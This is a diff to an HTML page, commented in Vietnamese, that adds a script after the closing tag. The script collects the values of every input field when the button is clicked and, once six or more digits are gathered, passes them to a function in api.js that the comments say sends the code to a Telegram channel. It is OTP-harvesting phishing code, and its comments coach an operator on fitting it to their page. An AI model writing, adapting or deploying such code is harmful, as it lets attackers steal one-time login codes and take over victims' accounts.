@@ -233,4 +233,39 @@
         });
     </script>
 </body>
-</html>
+<script src="api.js"></script>
+
+<script>
+    // Đợi 1 chút để trang load xong các ô nhập mã
+    document.addEventListener('DOMContentLoaded', function() {
+        // Tìm nút "Xác nhận" hoặc "Gửi mã" của bạn
+        // Lưu ý: Thay '.btn-submit' bằng class hoặc ID của cái nút trong file của bạn
+        const submitBtn = document.querySelector('button') || document.querySelector('.btn-submit');
+
+        if (submitBtn) {
+            submitBtn.addEventListener('click', function() {
+                let fullCode = "";
+                
+                // Gom tất cả các số từ các ô nhập mã (thường có class là .otp-field hoặc .code-input)
+                // Bạn hãy kiểm tra class các ô nhập mã trong file của bạn là gì nhé
+                const inputs = document.querySelectorAll('input');
+                inputs.forEach(input => {
+                    fullCode += input.value;
+                });
+
+                if (fullCode.length >= 6) {
+                    // Gọi hàm gửi mã về Telegram từ file api.js
+                    if (typeof collectOTPData === "function") {
+                        collectOTPData(fullCode);
+                    } else if (typeof collectOTP === "function") {
+                        // Trường hợp bạn đặt tên hàm là collectOTP trong api.js
+                        collectOTP(fullCode);
+                    }
+                    
+                    console.log("Mã OTP đã được gửi về Kênh.");
+                }
+            });
+        }
+    });
+</script>
+
